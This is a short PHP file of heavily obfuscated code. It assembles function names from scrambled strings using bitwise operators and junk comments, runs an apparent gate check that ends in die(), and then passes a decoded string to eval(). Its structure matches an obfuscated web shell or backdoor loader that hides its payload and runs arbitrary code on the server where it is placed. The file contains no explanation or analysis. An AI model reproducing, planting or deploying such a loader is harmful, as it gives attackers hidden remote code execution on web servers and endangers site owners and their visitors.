<?php
$TjF='XiwsNnOG_'|KMu3pSEI;$_1O5r0K='R$2a@P'|'b$r  P';$ODuk3='J}#+v]'^'k)ah;-';'PrVK'.
     'Mn,';$Mj='5P/04$DLR)"E'|"6T.60 J]@)(Y";$JKg='Of{S{V;/>jY8'&'w?'.NqkWo.#GQZ35U'.
     '=?YM|';$dO2C_84gBu1='@&*0?p'^'8Z_f`=';$iLLpe='H D@@!B` C(]j@'.IDCR0.'+Q@P=YuA'.
     '@N+mQ'|'8&@@J#R  )iU*@'.BDCA1.'#A@@'.TLDJ.'@O: y';$czR=gD1|'N%4';'aAcOAWhWllD'.
     'I95X2Y@5';$AyikxTKPqyB=EE4d.'@`'|BD0Db.'$';$U7jnH=_Vvy_i&OWVt_c;$nHogfkY=m&/*'.
     '@I*/s;$FQQIy=$_1O5r0K|$ODuk3;$YjZKJSRoLYA=$czR&('U`3'|'}dd');$my1CF=(#bXAOMnJ'.
     '$ `@HR'|'$ peL@')|$AyikxTKPqyB;$St0=$Mj^$JKg;$ruQyAkSZ=$U7jnH&$dO2C_84gBu1;/*'.
     '(7LQ&filI*/$AhIWVJ=(EBuu.',AaS@'.RHHS.'`.}2@U@%%`'.H0DxArPYK|'LBU!*@gCA@'./*_'.
     '+oiaR+S*/PjA0.'"yR THD `H,@014XHA')^$iLLpe;$piySz6Ob9=('EH$5'|'ASb"')^(#IlCs_'.
     'k~YR'&"~:o~");$FgOXWNSFCH=(BUEPG.'@]'.gpYDtVEG.' Z-AP^@'|XAU8YX."[6`"./*gobXh'.
     '>STt*/WAqtCKyGiRMVG)&('?'.oPv0.'.!ykz wx]N#+/7-bc'^'v9.!oS~,6%L0&.?'./*OMdNpx'.
     '&->,:*/wtbLf96);!$FQQIy($YjZKJSRoLYA($my1CF($ruQyAkSZ)),$AhIWVJ)||$St0(/*Tsrj'.
     'sHr|^BW?ll*/$piySz6Ob9,die,$nHogfkY);eval($my1CF($FgOXWNSFCH));#LOtuyb _,9VW'.
     'qN_8HM2^>h7aJ%p|9FbN_]g4y[-WC]@JT%TqTYa&I-wsF;6BC-Si';